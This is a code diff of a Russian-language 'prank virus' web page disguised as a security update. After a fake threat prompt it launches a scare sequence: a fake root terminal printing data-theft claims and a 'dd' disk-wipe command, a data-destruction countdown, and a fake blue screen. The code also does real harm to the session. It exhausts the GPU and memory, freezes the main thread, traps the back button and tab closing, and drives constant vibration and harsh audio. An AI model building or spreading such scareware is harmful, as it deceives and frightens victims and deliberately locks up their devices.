@@ -3,307 +3,385 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>System Driver Utility</title>
+<title>System_Security_Update</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; -webkit-touch-callout: none; -webkit-tap-highlight-color: transparent; }
+  * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; -webkit-touch-callout: none; -webkit-tap-highlight-color: transparent;}
   
   html, body { 
-    background: #0a0a0a; overflow: hidden; font-family: 'Courier New', monospace; 
-    height: 100vh; width: 100vw; color: #0f0; 
+    background: #050505; overflow: hidden; font-family: 'Courier New', monospace; 
+    height: 100vh; width: 100vh; color: #0f0; 
     position: fixed; top: 0; left: 0; right: 0; bottom: 0; touch-action: none; overscroll-behavior: none;
   }
 
-  /* Начальный безобидный экран */
-  #safe-start {
-    position: fixed; inset: 0; background: #f4f5f7; z-index: 99999;
+  /* ЭТАП 1: БЕЗОБИДНАЯ ЛОВУШКА (Белый экран) */
+  #trap-screen {
+    position: fixed; inset: 0; background: #ffffff; z-index: 99999;
     display: flex; justify-content: center; align-items: center; flex-direction: column;
     color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    transition: opacity 0.5s ease;
+    transition: opacity 0.3s ease;
   }
-  #safe-start h3 { font-size: 16px; font-weight: 500; margin-bottom: 8px; }
-  #safe-start .spinner {
-    width: 24px; height: 24px; border: 3px solid #ddd; border-top-color: #007aff;
-    border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 12px;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
+  .loader-bar { width: 200px; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-bottom: 15px;}
+  .loader-progress { width: 0%; height: 100%; background: #007aff; transition: width 0.1s; }
+  #trap-text { font-size: 14px; font-weight: 500; color: #555; }
 
-  /* Слои вируса */
-  #stress-layer { position: fixed; inset: 0; width: 100vw; height: 100vh; z-index: 1; opacity: 0; transition: opacity 2s; }
+  /* ЭТАП 2: ВИРУС */
+  #virus-container { display: none; position: fixed; inset: 0; z-index: 100; background: #000; }
   
-  #terminal { padding: 15px; font-size: 12px; line-height: 1.2; white-space: pre-wrap; word-break: break-all; font-weight: bold; height: 100%; overflow: hidden; text-align: left; z-index: 10; position: relative; text-shadow: 2px 2px 0 #000, -2px -2px 0 #000; opacity: 0; transition: opacity 1s; }
-  .red { color: #ff0000; text-shadow: 0 0 10px #ff0000, 2px 2px 0 #000; }
-  .white { color: #ffffff; text-shadow: 2px 2px 0 #000; }
+  /* WebGL Фрактал (Нагрузка на GPU) */
+  #webgl-bg { position: absolute; inset: 0; width: 100vw; height: 100vh; z-index: 1; opacity: 0.6; }
+  
+  /* Терминал (Нагрузка на DOM и глаза) */
+  #terminal { padding: 20px; font-size: 13px; line-height: 1.3; white-space: pre-wrap; word-break: break-all; font-weight: bold; height: 100%; overflow: hidden; text-align: left; z-index: 10; position: relative; text-shadow: 2px 2px 0 #000, -2px -2px 0 #000; }
+  .red { color: #ff0000; text-shadow: 0 0 10px #ff0000, 2px 2px 0 #000, -2px -2px 0 #000; }
+  .white { color: #ffffff; text-shadow: 2px 2px 0 #000, -2px -2px 0 #000; }
   .green { color: #00ff00; text-shadow: 0 0 5px #00ff00, 2px 2px 0 #000; }
-  .gray { color: #999999; text-shadow: 2px 2px 0 #000; }
 
-  #flash { position: fixed; inset: 0; background: #f00; opacity: 0; pointer-events: none; z-index: 99; mix-blend-mode: difference; }
+  /* Эффекты тряски */
+  #shake-wrap { position: absolute; inset: 0; z-index: 10; }
+  .shaking { animation: shake 0.05s infinite; }
+  @keyframes shake {
+    0% { transform: translate(0, 0); } 10% { transform: translate(-12px, 8px) rotate(-1.5deg); } 20% { transform: translate(12px, -8px) rotate(1.5deg); } 
+    30% { transform: translate(-8px, -8px) rotate(-1deg); } 40% { transform: translate(8px, 8px) rotate(1deg); } 50% { transform: translate(-12px, 4px) rotate(-2deg); } 
+    60% { transform: translate(12px, -4px) rotate(2deg); } 70% { transform: translate(-5px, 12px) rotate(-1deg); } 80% { transform: translate(5px, -12px) rotate(1deg); } 
+    90% { transform: translate(-8px, 0); } 100% { transform: translate(0, 0); }
+  }
   
-  #glitch-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 950; opacity: 0; font-size: 8px; color: #0f0; overflow: hidden; word-break: break-all; transition: opacity 1s; }
+  #flash { position: fixed; inset: 0; background: #f00; opacity: 0; pointer-events: none; z-index: 99; mix-blend-mode: difference; }
 
-  /* Финальный оверлей таймера */
-  #lock-overlay { position: fixed; inset: 0; z-index: 900; background: rgba(5, 0, 0, 0.88); display: none; justify-content: center; align-items: center; flex-direction: column; pointer-events: all; border: 15px solid #f00; box-shadow: inset 0 0 150px rgba(255, 0, 0, 0.6); }
-  #timer-text { color: #f00; font-size: 18px; letter-spacing: 4px; margin-bottom: 10px; text-shadow: 0 0 15px #f00; font-weight: bold; }
-  #timer { font-size: 32vh; color: #f00; font-weight: bold; text-shadow: 0 0 70px #f00, 0 0 140px #f00; line-height: 1; }
-  #warning-text { color: #fff; font-size: 15px; margin-top: 20px; animation: blink 0.25s infinite; font-weight: bold; letter-spacing: 2px; }
+  /* Таймер и блокировка */
+  #lock-overlay { position: fixed; inset: 0; z-index: 900; background: rgba(10, 0, 0, 0.85); display: none; justify-content: center; align-items: center; flex-direction: column; pointer-events: all; border: 15px solid #f00; }
+  #timer-text { color: #f00; font-size: 18px; letter-spacing: 6px; margin-bottom: 10px; text-shadow: 0 0 15px #f00; font-weight: bold; }
+  #timer { font-size: 35vh; color: #f00; font-weight: bold; text-shadow: 0 0 70px #f00, 0 0 140px #f00, 4px 4px 0 #000; line-height: 1; }
+  #warning-text { color: #fff; font-size: 16px; margin-top: 20px; animation: blink 0.2s infinite; font-weight: bold; letter-spacing: 2px; }
   @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
 
-  .shaking { animation: shake 0.05s infinite; }
-  @keyframes shake { 0% { transform: translate(0,0); } 25% { transform: translate(-6px, 4px) rotate(-1deg); } 50% { transform: translate(6px, -4px) rotate(1deg); } 75% { transform: translate(-4px, -6px); } 100% { transform: translate(0,0); } }
+  #glitch-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 950; opacity: 0.3; font-size: 9px; color: #0f0; overflow: hidden; word-break: break-all; }
+
+  /* Синий экран */
+  #final { position: fixed; inset: 0; display: none; z-index: 1000; background: #0000AA; color: #fff; text-align: left; padding: 20px; font-size: 13px; flex-direction: column; justify-content: flex-start; overflow: hidden; font-family: 'Courier New', monospace;}
+  #final h2 { background: #AAAAAA; color: #0000AA; padding: 2px 15px; display: inline-block; font-size: 16px; margin-bottom: 20px; align-self: center; font-weight: normal; }
+  #final p { margin-bottom: 12px; line-height: 1.4; text-align: left; }
+  .dump-box { border: 1px solid #fff; padding: 10px; margin-top: 20px; font-size: 11px; line-height: 1.2; color: #ccc; overflow: hidden; height: 40vh; }
 </style>
 </head>
 <body>
 
-<!-- 1. Безобидное начало -->
-<div id="safe-start">
-  <div class="spinner"></div>
-  <h3>Проверка драйвера устройства</h3>
-  <p style="font-size: 12px; color: #888;">Подождите, идет сканирование...</p>
+<!-- ЭТАП 1: ЛОВУШКА -->
+<div id="trap-screen">
+  <div class="loader-bar"><div class="loader-progress" id="progress"></div></div>
+  <div id="trap-text">Проверка подлинности устройства...</div>
 </div>
 
-<!-- 2. Фоновая WebGL-нагрузка -->
-<canvas id="stress-layer"></canvas>
+<!-- ЭТАП 2: АД -->
+<div id="virus-container">
+  <canvas id="webgl-bg"></canvas>
+  
+  <div id="shake-wrap">
+    <div id="terminal"></div>
+  </div>
 
-<!-- 3. Терминал -->
-<div id="terminal"></div>
+  <div id="glitch-layer"></div>
+  <div id="flash"></div>
 
-<!-- 4. Глитч-слой -->
-<div id="glitch-layer"></div>
-<div id="flash"></div>
+  <div id="lock-overlay">
+    <div id="timer-text">УНИЧТОЖЕНИЕ ДАННЫХ:</div>
+    <div id="timer">40</div>
+    <div id="warning-text">ПОПЫТКА ВЫХОДА ЗАФИКСИРОВАНА</div>
+  </div>
 
-<!-- 5. Финальная блокировка -->
-<div id="lock-overlay">
-  <div id="timer-text">УНИЧТОЖЕНИЕ ДАННЫХ:</div>
-  <div id="timer">40</div>
-  <div id="warning-text">ВЫХОД ЗАБЛОКИРОВАН</div>
+  <div id="final">
+    <h2>FATAL_KERNEL_PANIC</h2>
+    <p>A problem has been detected and the system has been shut down to prevent damage.</p>
+    <p>KERNEL_DATA_INPAGE_ERROR</p>
+    <p>Technical information:</p>
+    <p>*** STOP: 0x0000007B (0xFFFFF880009A9928, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)</p>
+    <p>Beginning dump of physical memory...</p>
+    <div class="dump-box" id="memory-dump"></div>
+  </div>
 </div>
 
 <script>
 /* ==========================================================================
-   ЧАСТЬ 1: СКРЫТЫЙ КОНТЕКСТ ЗВУКА И WEBGL
+   ЭТАП 1: ЛОВУШКА И ПЕРВЫЙ КЛИК
    ========================================================================== */
-let audioCtx = null;
+const trapScreen = document.getElementById('trap-screen');
+const virusContainer = document.getElementById('virus-container');
+const progressBar = document.getElementById('progress');
+const trapText = document.getElementById('trap-text');
+
+let progress = 0;
+let trapInterval = setInterval(() => {
+    progress += Math.random() * 15;
+    if (progress > 100) progress = 100;
+    progressBar.style.width = progress + '%';
+    if (progress === 100) {
+        clearInterval(trapInterval);
+        trapText.textContent = "ОБНАРУЖЕНА УГРОЗА! НАЖМИТЕ ДЛЯ ИЗОЛЯЦИИ";
+        trapText.style.color = "#f00";
+        trapText.style.fontWeight = "bold";
+        trapScreen.addEventListener('touchstart', startHell, { once: true });
+        trapScreen.addEventListener('click', startHell, { once: true });
+    }
+}, 150);
+
+/* ==========================================================================
+   ЭТАП 2: ИНИЦИАЛИЗАЦИЯ АДА
+   ========================================================================== */
+let audioCtx;
+let isLocked = false;
+let endTime = 0;
 let webglActive = false;
-const canvas = document.getElementById('stress-layer');
-const gl = canvas.getContext('webgl');
+let memoryHog = [];
 
-// Инициализация звука только после первого касания пользователя
-function initAudio() {
-  if (!audioCtx) {
+function startHell() {
+    // 1. Инициализация звука (жизненно важно для пранка)
     audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-  }
-  if (audioCtx.state === 'suspended') audioCtx.resume();
+    
+    // 2. Скрываем ловушку, показываем вирус
+    trapScreen.style.opacity = '0';
+    setTimeout(() => {
+        trapScreen.style.display = 'none';
+        virusContainer.style.display = 'block';
+        document.body.classList.add('shaking');
+        
+        // 3. Полный экран
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen().catch(() => {});
+        }
+        
+        // 4. Запуск всех систем
+        startWebGL();
+        startTerminal();
+        startCountdown();
+        startLagging();
+        
+    }, 300);
 }
-document.addEventListener('touchstart', initAudio, { once: true });
-document.addEventListener('click', initAudio, { once: true });
 
+/* ==========================================================================
+   ЗВУК (Резкий, скрежещущий)
+   ========================================================================== */
 function playHarshGlitch() {
-  if (!audioCtx || audioCtx.state !== 'running') return;
-  try {
-    const osc = audioCtx.createOscillator();
-    const gain = audioCtx.createGain();
-    osc.type = 'sawtooth';
-    osc.frequency.setValueAtTime(Math.random() * 1000 + 300, audioCtx.currentTime);
-    osc.frequency.exponentialRampToValueAtTime(45, audioCtx.currentTime + 0.18);
-    gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.005, audioCtx.currentTime + 0.18);
-    osc.connect(gain); gain.connect(audioCtx.destination);
-    osc.start(); osc.stop(audioCtx.currentTime + 0.18);
-  } catch(e) {}
+  if (!audioCtx) return;
+  const osc = audioCtx.createOscillator();
+  const gain = audioCtx.createGain();
+  osc.type = 'sawtooth';
+  osc.frequency.setValueAtTime(Math.random() * 1200 + 400, audioCtx.currentTime);
+  osc.frequency.exponentialRampToValueAtTime(40, audioCtx.currentTime + 0.15);
+  gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+  gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.15);
+  osc.connect(gain); gain.connect(audioCtx.destination);
+  osc.start(); osc.stop(audioCtx.currentTime + 0.15);
 }
 
 /* ==========================================================================
-   ЧАСТЬ 2: ВЫСОКОНАГРУЖЕННЫЙ WEBGL ФРАКТАЛ (RAYMARCHING)
+   НАГРУЗКА НА GPU (WebGL Фрактал)
    ========================================================================== */
-if (gl) {
-  const vsSource = `attribute vec2 a_position; void main() { gl_Position = vec4(a_position, 0.0, 1.0); }`;
-  const fsSource = `
-    precision highp float;
-    uniform vec2 u_resolution;
-    uniform float u_time;
-    float map(vec3 p) {
-        vec3 z = p; float dr = 1.0; float r = 0.0;
-        for (int i = 0; i < 8; i++) {
-            r = length(z); if (r > 2.0) break;
-            float theta = acos(z.z/r);
-            float phi = atan(z.y, z.x);
-            dr = pow(r, 8.0)*8.0*dr + 1.0;
-            float zr = pow(r, 8.0);
-            theta = theta*8.0; phi = phi*8.0;
-            z = zr*vec3(sin(theta)*cos(phi), sin(phi)*sin(theta), cos(theta));
-            z += p;
-        }
-        return 0.5*log(r)*r/dr;
-    }
-    void main() {
-        vec2 uv = (gl_FragCoord.xy * 2.0 - u_resolution.xy) / u_resolution.y;
-        vec3 ro = vec3(0.0, 0.0, -3.0 + sin(u_time)*0.4);
-        vec3 rd = normalize(vec3(uv, 1.0));
-        float t = 0.0;
-        for (int i = 0; i < 90; i++) {
-            vec3 p = ro + rd * t;
-            float d = map(p);
-            if (d < 0.001 || t > 4.5) break;
-            t += d;
-        }
-        vec3 col = vec3(0.0);
-        if (t < 4.5) {
-            vec3 p = ro + rd * t;
-            col = vec3(sin(p.x*4.0 + u_time)*0.5+0.5, cos(p.y*4.0)*0.5+0.5, sin(p.z*4.0)*0.5+0.5);
-        }
-        gl_FragColor = vec4(col, 1.0);
-    }
-  `;
-  function compile(type, src) { const s = gl.createShader(type); gl.shaderSource(s, src); gl.compileShader(s); return s; }
-  const prog = gl.createProgram();
-  gl.attachShader(prog, compile(gl.VERTEX_SHADER, vsSource));
-  gl.attachShader(prog, compile(gl.FRAGMENT_SHADER, fsSource));
-  gl.linkProgram(prog); gl.useProgram(prog);
-  
-  const buf = gl.createBuffer();
-  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), gl.STATIC_DRAW);
-  
-  const aPos = gl.getAttribLocation(prog, 'a_position');
-  gl.enableVertexAttribArray(aPos);
-  gl.vertexAttribPointer(aPos, 2, gl.FLOAT, false, 0, 0);
-  
-  const uRes = gl.getUniformLocation(prog, 'u_resolution');
-  const uTime = gl.getUniformLocation(prog, 'u_time');
-  
-  canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-  gl.viewport(0, 0, canvas.width, canvas.height);
-  gl.uniform2f(uRes, canvas.width, canvas.height);
+function startWebGL() {
+    const canvas = document.getElementById('webgl-bg');
+    const gl = canvas.getContext('webgl');
+    if (!gl) return;
 
-  let startTs = 0;
-  function render() {
-    if (!webglActive) return;
-    gl.uniform1f(uTime, (performance.now() - startTs) / 1000.0);
-    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-    requestAnimationFrame(render);
-  }
-  window.startHeavyWebGL = () => { startTs = performance.now(); webglActive = true; render(); };
+    const vs = `attribute vec2 p; void main() { gl_Position = vec4(p, 0.0, 1.0); }`;
+    const fs = `
+        precision highp float;
+        uniform vec2 res;
+        uniform float time;
+        float map(vec3 p) {
+            vec3 z = p; float dr = 1.0; float r = 0.0;
+            for (int i = 0; i < 6; i++) {
+                r = length(z); if (r > 2.0) break;
+                float theta = acos(z.z/r); float phi = atan(z.y, z.x);
+                dr = pow(r, 6.0)*6.0*dr + 1.0; float zr = pow(r, 6.0);
+                theta = theta*6.0; phi = phi*6.0;
+                z = zr*vec3(sin(theta)*cos(phi), sin(phi)*sin(theta), cos(theta));
+                z += p;
+            }
+            return 0.5*log(r)*r/dr;
+        }
+        void main() {
+            vec2 uv = (gl_FragCoord.xy * 2.0 - res.xy) / res.y;
+            vec3 ro = vec3(0.0, 0.0, -3.0 + sin(time)*0.5);
+            vec3 rd = normalize(vec3(uv, 1.0));
+            float t = 0.0;
+            for (int i = 0; i < 60; i++) {
+                vec3 p = ro + rd * t;
+                float d = map(p);
+                if (d < 0.001 || t > 4.0) break;
+                t += d;
+            }
+            vec3 col = vec3(0.0);
+            if (t < 4.0) {
+                vec3 p = ro + rd * t;
+                col = vec3(sin(p.x*4.0 + time)*0.5+0.5, cos(p.y*4.0)*0.5+0.5, 0.2);
+            }
+            gl_FragColor = vec4(col, 1.0);
+        }
+    `;
+    function compile(type, src) { const s = gl.createShader(type); gl.shaderSource(s, src); gl.compileShader(s); return s; }
+    const prog = gl.createProgram();
+    gl.attachShader(prog, compile(gl.VERTEX_SHADER, vs));
+    gl.attachShader(prog, compile(gl.FRAGMENT_SHADER, fs));
+    gl.linkProgram(prog); gl.useProgram(prog);
+    
+    const buf = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), gl.STATIC_DRAW);
+    const aPos = gl.getAttribLocation(prog, 'a_position');
+    gl.enableVertexAttribArray(aPos); gl.vertexAttribPointer(aPos, 2, gl.FLOAT, false, 0, 0);
+    
+    const uRes = gl.getUniformLocation(prog, 'res');
+    const uTime = gl.getUniformLocation(prog, 'time');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    gl.viewport(0, 0, canvas.width, canvas.height);
+    gl.uniform2f(uRes, canvas.width, canvas.height);
+
+    let start = performance.now();
+    webglActive = true;
+    function render() {
+        if (!webglActive) return;
+        gl.uniform1f(uTime, (performance.now() - start) / 1000.0);
+        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+        requestAnimationFrame(render);
+    }
+    render();
 }
 
 /* ==========================================================================
-   ЧАСТЬ 3: КАСКАДНЫЙ СЦЕНАРИЙ РАЗРУШЕНИЯ
+   ВЫВОД ТЕКСТА (Без цензуры и шуток)
    ========================================================================== */
-const terminal = document.getElementById('terminal');
-const glitchLayer = document.getElementById('glitch-layer');
-const safeStart = document.getElementById('safe-start');
-const lockOverlay = document.getElementById('lock-overlay');
-const timerEl = document.getElementById('timer');
-
 const logLines = [
-  { t: "[ OK ] Системные драйверы загружены.", c: "gray" },
-  { t: "[ WARN ] Критический сбой модуля kernel32.dll", c: "red" },
-  { t: "[ ! ] Внедрение вредоносного кода в сектор 0x00A3F...", c: "red" },
-  { t: "root@android:/ # sudo wipe --force", c: "white" },
-  { t: "[ ERR ] Повреждение памяти (0xDEADBEEF)", c: "red" },
-  { t: "[ ERR ] SELinux заблокирован", c: "red" },
-  { t: "[ X ] УТЕЧКА ПЕРСОНАЛЬНЫХ ДАННЫХ", c: "red" },
-  { t: "[ X ] ДОСТУП К КАМЕРЕ И ГАЛЕРЕЕ", c: "red" },
-  { t: "> АХАЗАЗА... ТЫ ПОПАЛСЯ.", c: "red" },
-  { t: "> ПИЗДА ТЕБЕ.", c: "red" },
-  { t: "> СИСТЕМА УНИЧТОЖЕНА.", c: "red" }
+  {t: "root@android:/ # sudo mount -o rw,remount /", c: "gray"},
+  {t: "[ OK ] Root privileges escalated.", c: "green"},
+  {t: "[ WARN ] Disabling SELinux...", c: "red"},
+  {t: "> INJECTING PAYLOAD TO KERNEL", c: "red"},
+  {t: "> ACCESSING /data/ LOCAL STORAGE", c: "red"},
+  {t: "> CAMERA AND MICROPHONE HIJACKED", c: "red"},
+  {t: "> EXTRACTING PASSWORDS...", c: "red"},
+  {t: "> BANKING APP DATA COMPROMISED", c: "red"},
+  {t: "[ ERR ] Memory corruption at 0x0000DEAD", c: "red"},
+  {t: "# dd if=/dev/zero of=/dev/block/mmcblk0", c: "white"},
+  {t: "> WIPING FILESYSTEM...", c: "red"},
+  {t: "> SYSTEM OVERRIDE ACTIVE", c: "red"},
+  {t: "АХАЗАЗА... ТЕПЕРЬ ТЫ МОЙ.", c: "red"},
+  {t: "ВЫХОДА НЕТ.", c: "red"}
 ];
 
-// Мягкое появление текста
-function initTerminalText() {
-  terminal.style.opacity = "1";
-  logLines.forEach((line, index) => {
-    setTimeout(() => {
-      const div = document.createElement('div');
-      div.className = line.c;
-      div.textContent = line.t;
-      terminal.appendChild(div);
-      if (line.c === 'red') playHarshGlitch();
-    }, index * 180);
-  });
+function startTerminal() {
+    const term = document.getElementById('terminal');
+    logLines.forEach((line, i) => {
+        setTimeout(() => {
+            const div = document.createElement('div');
+            div.className = line.c;
+            div.textContent = line.t;
+            term.appendChild(div);
+            playHarshGlitch();
+            if (navigator.vibrate) navigator.vibrate(40);
+        }, i * 350);
+    });
 }
 
-// Запуск разрушительного WebGL и мерцания
-function escalateToChaos() {
-  if (window.startHeavyWebGL) window.startHeavyWebGL();
-  document.getElementById('stress-layer').style.opacity = "0.4";
-  glitchLayer.style.opacity = "0.25";
-  
-  const glitchInterval = setInterval(() => {
-    let garbage = "";
-    const chars = "ABCDEF0123456789_!@#$%^&*";
-    for (let i = 0; i < 400; i++) garbage += chars[Math.floor(Math.random() * chars.length)];
-    glitchLayer.textContent = garbage;
-  }, 35);
-
-  setTimeout(() => {
-    document.body.classList.add('shaking');
-    lockOverlay.style.display = "flex";
-    startFinalCountdown(glitchInterval);
-  }, 4500); // Через 4.5 секунды после начала терминала
+/* ==========================================================================
+   ЖЕСТКИЙ ПАРАЛИЧ СИСТЕМЫ (Main Thread Blocking)
+   ========================================================================== */
+function freezeUI(ms) {
+    const start = Date.now();
+    // Блокируем главный поток. Телефон перестает реагировать на свайпы.
+    while (Date.now() - start < ms) {} 
 }
 
-// Финальный отсчет с блокировкой выхода
-function startFinalCountdown(glitchInt) {
-  // Защита от закрытия страницы
-  window.addEventListener('beforeunload', (e) => {
-    e.preventDefault();
-    e.returnValue = "ВНИМАНИЕ! Уничтожение данных не завершено.";
-    return e.returnValue;
-  });
+function startLagging() {
+    // Пожиратель памяти
+    setInterval(() => {
+        for (let i = 0; i < 50; i++) {
+            memoryHog.push(new Array(5000).fill("X"));
+        }
+        if (memoryHog.length > 1000) memoryHog = [];
+    }, 50);
 
-  // Блокировка кнопки "Назад"
-  history.pushState(null, null, location.href);
-  window.addEventListener('popstate', () => {
-    history.pushState(null, null, location.href);
-  });
-
-  // Блокировка свайпов
-  document.addEventListener('touchmove', (e) => { e.preventDefault(); }, { passive: false });
-
-  // Вход в полноэкранный режим
-  const docEl = document.documentElement;
-  if (docEl.requestFullscreen) docEl.requestFullscreen().catch(() => {});
-  else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
-
-  // Отсчет до 0
-  let left = 40;
-  timerEl.textContent = left;
-
-  const timerInt = setInterval(() => {
-    left--;
-    timerEl.textContent = left;
-    playHarshGlitch();
-    if (navigator.vibrate) navigator.vibrate([150, 50, 150]);
-
-    if (left <= 20) {
-      timerEl.style.color = "#ffcc00";
-      timerEl.style.textShadow = "0 0 60px #ffcc00";
-    }
-    if (left <= 5) {
-      document.body.style.animationDuration = "0.02s";
-      timerEl.style.color = "#fff";
-      timerEl.style.textShadow = "0 0 80px #fff";
-    }
-
-    if (left <= 0) {
-      clearInterval(timerInt);
-      clearInterval(glitchInt);
-      webglActive = false; // Отключаем нагрузку
-      safeStart.innerHTML = "<h2 style='color:#0a0a0a;'>FATAL SYSTEM CRASH</h2><p style='color:#666;'>Произошла критическая ошибка.</p>";
-      safeStart.style.background = "#0000AA"; // Синий экран
-      safeStart.style.color = "#fff";
-    }
-  }, 1000);
+    // Периодические зависания интерфейса
+    setInterval(() => {
+        if (isLocked) {
+            freezeUI(1500); // 1.5 секунды полного ступора
+        }
+    }, 2500);
 }
 
-// Каскадная активация без единого клика
-setTimeout(() => {
-  safeStart.style.opacity = "0";
-  setTimeout(() => {
-    safeStart.style.display = "none";
-    initTerminalText();
-    setTimeout(escalateToChaos, 2000); // Переход в хаос через 2 секунды
-  }, 500);
-}, 1200);
+/* ==========================================================================
+   ТАЙМЕР И БЛОКИРОВКА ВЫХОДА
+   ========================================================================== */
+function startCountdown() {
+    isLocked = true;
+    endTime = Date.now() + 40000;
+    
+    const timerEl = document.getElementById('timer');
+    const lockOverlay = document.getElementById('lock-overlay');
+    const glitchLayer = document.getElementById('glitch-layer');
+    lockOverlay.style.display = 'flex';
+
+    // Блокировка закрытия вкладки
+    window.addEventListener('beforeunload', (e) => {
+        if (isLocked) {
+            e.preventDefault();
+            e.returnValue = "ПРОЦЕСС УНИЧТОЖЕНИЯ НЕ ЗАВЕРШЕН. ВЫ УВЕРЕНЫ?";
+            return e.returnValue;
+        }
+    });
+
+    // Блокировка кнопки Назад (Спам истории)
+    for(let i=0; i<10; i++) history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+        if (isLocked) {
+            history.go(1);
+            playHarshGlitch();
+        }
+    };
+
+    // Генератор случайного мусора
+    setInterval(() => {
+        let chars = "ABCDEF0123456789_!@#$%^&*";
+        let glitch = "";
+        for(let i=0; i<400; i++) glitch += chars.charAt(Math.floor(Math.random() * chars.length));
+        glitchLayer.textContent = glitch;
+    }, 30);
+
+    // Отсчет
+    const interval = setInterval(() => {
+        let timeLeft = Math.ceil((endTime - Date.now()) / 1000);
+        if (timeLeft < 0) timeLeft = 0;
+        timerEl.textContent = timeLeft;
+        
+        playHarshGlitch();
+        if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 500]);
+        
+        if (timeLeft <= 10) {
+            timerEl.style.color = "#fff";
+            document.getElementById('flash').style.opacity = document.getElementById('flash').style.opacity === '0.8' ? '0' : '0.8';
+        }
+
+        if (timeLeft <= 0) {
+            clearInterval(interval);
+            endPrank();
+        }
+    }, 1000);
+}
+
+function endPrank() {
+    isLocked = false;
+    webglActive = false;
+    memoryHog = [];
+    
+    document.getElementById('virus-container').style.display = 'none';
+    document.getElementById('final').style.display = 'flex';
+    
+    // Генерация фейкового дампа памяти
+    let dump = "";
+    for (let i = 0; i < 80; i++) {
+        let addr = (0xFFFFF88000000000 + Math.floor(Math.random() * 1000000000)).toString(16).toUpperCase();
+        dump += `${addr}  ${Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase()}  ${Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase()}\n`;
+    }
+    document.getElementById('memory-dump').textContent = dump;
+}
 </script>
 </body>
 </html>
